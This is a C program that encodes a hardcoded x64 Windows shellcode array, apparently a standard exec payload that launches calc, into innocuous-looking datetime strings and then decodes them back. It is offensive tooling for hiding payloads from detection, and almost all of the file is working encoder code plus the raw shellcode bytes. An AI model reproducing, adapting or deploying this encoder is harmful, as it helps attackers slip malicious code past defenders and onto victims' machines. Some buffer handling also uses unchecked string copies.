#define _CRT_SECURE_NO_WARNINGS  // Optional: comment this out to enforce *_s
#define MAX_CHUNKS 128

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// --- Chunking ---

typedef struct {
    uint8_t bytes[4];
    size_t length;
} ByteChunk;

ByteChunk* split_into_chunks(const uint8_t* data, size_t data_len, size_t* out_chunk_count) {
    size_t chunk_size = 4;
    size_t count = (data_len + chunk_size - 1) / chunk_size;
    ByteChunk* chunks = malloc(sizeof(ByteChunk) * count);
    if (!chunks) {
        fprintf(stderr, "Memory allocation failed.\n");
        *out_chunk_count = 0;
        return NULL;
    }

    for (size_t i = 0; i < count; i++) {
        size_t offset = i * chunk_size;
        size_t remaining = data_len - offset;
        size_t copy_len = remaining >= chunk_size ? chunk_size : remaining;

        memset(chunks[i].bytes, 0, chunk_size);
        memcpy(chunks[i].bytes, data + offset, copy_len);
        chunks[i].length = copy_len;
    }

    *out_chunk_count = count;
    return chunks;
}

// --- Region Lookup Table ---

typedef struct {
    const char* bits;
    const char* region;
} RegionEntry;

RegionEntry region_table[] = {
    {"00000", "WORLD"}, {"00001", "NORTH_AMERICA"}, {"00010", "LATIN_AMERICA"}, {"00011", "EUROPE"},
    {"00100", "EU_EASTERN"}, {"00101", "EU_WESTERN"}, {"00110", "EU_NORDIC"}, {"00111", "EU_SOUTHERN"},
    {"01000", "ASIA"}, {"01001", "EAST_ASIA"}, {"01010", "SOUTH_ASIA"}, {"01011", "SOUTHEAST_ASIA"},
    {"01100", "CENTRAL_ASIA"}, {"01101", "PACIFIC"}, {"01110", "MIDDLE_EAST"}, {"01111", "NORTH_AFRICA"},
    {"10000", "SUB_SAHARAN_AFRICA"}, {"10001", "AFRICA_EAST"}, {"10010", "AFRICA_WEST"}, {"10011", "AFRICA_CENTRAL"},
    {"10100", "AFRICA_SOUTH"}, {"10101", "RUSSIA"}, {"10110", "CIS"}, {"10111", "CARIBBEAN"},
    {"11000", "OCEANIA"}, {"11001", "AUSTRALIA_NEW_ZEALAND"}, {"11010", "CENTRAL_AMERICA"},
    {"11011", "BALKANS"}, {"11100", "BENELUX"}, {"11101", "SCANDINAVIA"}, {"11110", "MAGHREB"}, {"11111", "GCC"}
};

#define NUM_REGIONS (sizeof(region_table) / sizeof(region_table[0]))

const char* lookup_region(const char* bits) {
    for (int i = 0; i < NUM_REGIONS; i++) {
        if (strcmp(region_table[i].bits, bits) == 0) {
            return region_table[i].region;
        }
    }
    return "UNKNOWN";
}

const char* bits_from_region(const char* region) {
    for (int i = 0; i < NUM_REGIONS; i++) {
        if (strcmp(region_table[i].region, region) == 0) {
            return region_table[i].bits;
        }
    }
    return "00000"; // Default
}

// --- Weekdays ---

const char* days[] = { "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday" };
const uint8_t day_values[] = { 1, 2, 3, 4, 5, 6, 7 };

uint8_t get_day_value(const char* day) {
    for (int i = 0; i < 7; i++) {
        if (strcmp(day, days[i]) == 0) return day_values[i];
    }
    return 1;
}

// --- TimeFields Struct ---

typedef struct {
    char weekday[10];
    int hour, minute, second;
    int day, month, year;
    char region[24];
    char ampm[3];
    char utcgmt[4];
} TimeFields;

// --- Time Utilities ---

int xor_if_needed(int value, int limit_min, int limit_max, int xor_val, char* xor_bits) {
#ifdef _MSC_VER
    strcat_s(xor_bits, 6, (value <= limit_min || value >= limit_max) ? "1" : "0");
#else
    strcat(xor_bits, (value <= limit_min || value >= limit_max) ? "1" : "0");
#endif
    return (value <= limit_min || value >= limit_max) ? (value ^ xor_val) : value;
}

int undo_xor_if_needed(int value, int limit_min, int limit_max, int xor_val, char xor_flag) {
    return (xor_flag == '1') ? (value ^ xor_val) : value;
}

void obfuscate_time(int* hour, int* minute, int* second, char* utcgmt) {
    if ((*hour + *minute) <= 23 && (*minute + *second) <= 59 && (*second + *hour) <= 59) {
        int h = *hour, m = *minute, s = *second;
        *hour = h + m;
        *minute = m + s;
        *second = s + h;
#ifdef _MSC_VER
        strcpy_s(utcgmt, 4, "GMT");
#else
        strcpy(utcgmt, "GMT");
#endif
    }
    else {
#ifdef _MSC_VER
        strcpy_s(utcgmt, 4, "UTC");
#else
        strcpy(utcgmt, "UTC");
#endif
    }
}

void deobfuscate_time(int* hour, int* minute, int* second, const char* utcgmt) {
    if (strcmp(utcgmt, "GMT") == 0) {
        int H = *hour, M = *minute, S = *second;
        int b = (H + M - S) / 2;
        int a = H - b;
        int c = M - b;
        *hour = a;
        *minute = b;
        *second = c;
    }
}

// --- Encoder ---

TimeFields encode_bytes_to_time(uint8_t b[4]) {
    TimeFields tf;
    char xor_bits[6] = { 0 };
    int day_index = rand() % 7;

#ifdef _MSC_VER
    strcpy_s(tf.weekday, sizeof(tf.weekday), days[day_index]);
#else
    strcpy(tf.weekday, days[day_index]);
#endif
    uint8_t day_val = day_values[day_index];

    uint8_t b_enc[4];
    for (int i = 0; i < 4; i++) {
        b_enc[i] = b[i] ^ day_val;
    }

    uint32_t n = (b_enc[0] << 24) | (b_enc[1] << 16) | (b_enc[2] << 8) | b_enc[3];

    int raw_hour = (n >> 27) & 0x1F;
    int raw_minute = (n >> 21) & 0x3F;
    int raw_second = (n >> 15) & 0x3F;
    int raw_day = (n >> 10) & 0x1F;
    int raw_month = (n >> 6) & 0x0F;
    int raw_year = n & 0x3F;

    int hour = xor_if_needed(raw_hour, -1, 24, 12, xor_bits);
    int minute = xor_if_needed(raw_minute, -1, 60, 30, xor_bits);
    int second = xor_if_needed(raw_second, -1, 60, 30, xor_bits);
    int day = xor_if_needed(raw_day, 0, 31, 16, xor_bits);
    int month = xor_if_needed(raw_month, 0, 13, 6, xor_bits);
    int year = 1990 + raw_year;

#ifdef _MSC_VER
    strcpy_s(tf.region, sizeof(tf.region), lookup_region(xor_bits));
#else
    strcpy(tf.region, lookup_region(xor_bits));
#endif

    obfuscate_time(&hour, &minute, &second, tf.utcgmt);

#ifdef _MSC_VER
    strcpy_s(tf.ampm, sizeof(tf.ampm), (hour <= 11) ? "AM" : "PM");
#else
    strcpy(tf.ampm, (hour <= 11) ? "AM" : "PM");
#endif

    tf.hour = hour;
    tf.minute = minute;
    tf.second = second;
    tf.day = day;
    tf.month = month;
    tf.year = year;

    return tf;
}

// --- Decoder ---

void decode_time_to_bytes(const TimeFields* tf, uint8_t out_bytes[4]) {
    uint8_t day_val = get_day_value(tf->weekday);
    char xor_bits[6] = { 0 };
    strcpy(xor_bits, bits_from_region(tf->region));

    int hour = tf->hour;
    int minute = tf->minute;
    int second = tf->second;
    deobfuscate_time(&hour, &minute, &second, tf->utcgmt);

    int raw_hour = undo_xor_if_needed(hour, -1, 24, 12, xor_bits[0]);
    int raw_minute = undo_xor_if_needed(minute, -1, 60, 30, xor_bits[1]);
    int raw_second = undo_xor_if_needed(second, -1, 60, 30, xor_bits[2]);
    int raw_day = undo_xor_if_needed(tf->day, 0, 31, 16, xor_bits[3]);
    int raw_month = undo_xor_if_needed(tf->month, 0, 13, 6, xor_bits[4]);
    int raw_year = tf->year - 1990;

    uint32_t n = (raw_hour << 27) | (raw_minute << 21) | (raw_second << 15) |
        (raw_day << 10) | (raw_month << 6) | raw_year;

    out_bytes[0] = ((n >> 24) & 0xFF) ^ day_val;
    out_bytes[1] = ((n >> 16) & 0xFF) ^ day_val;
    out_bytes[2] = ((n >> 8) & 0xFF) ^ day_val;
    out_bytes[3] = (n & 0xFF) ^ day_val;
}

// --- Main ---

int main() {
    srand((unsigned int)time(NULL));

    uint8_t shellcode[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00 };
    size_t chunk_count;
    ByteChunk* chunks = split_into_chunks(shellcode, sizeof(shellcode), &chunk_count);
    if (!chunks) return 1;

    TimeFields tf_chunks[MAX_CHUNKS];
    uint8_t recovered[sizeof(shellcode)] = { 0 };

    printf("[+] Shellcode encoded to datetime strings:\n");
    for (size_t i = 0; i < chunk_count; i++) {
        tf_chunks[i] = encode_bytes_to_time(chunks[i].bytes);
        printf("%s, %02d/%02d/%d %02d:%02d:%02d %s %s | Region=%s\n",
            tf_chunks[i].weekday, tf_chunks[i].day, tf_chunks[i].month, tf_chunks[i].year,
            tf_chunks[i].hour, tf_chunks[i].minute, tf_chunks[i].second,
            tf_chunks[i].ampm, tf_chunks[i].utcgmt, tf_chunks[i].region);
    }

    printf("\n[+] Decoding...\n");
    for (size_t i = 0; i < chunk_count; i++) {
        uint8_t out[4];
        decode_time_to_bytes(&tf_chunks[i], out);
        size_t len = chunks[i].length;
        memcpy(&recovered[i * 4], out, len);
    }

    printf("[+] Recovered bytes: ");
    for (size_t i = 0; i < sizeof(shellcode); i++) {
        printf("%02X ", recovered[i]);
    }
    printf("\n");

    free(chunks);
    return 0;
}
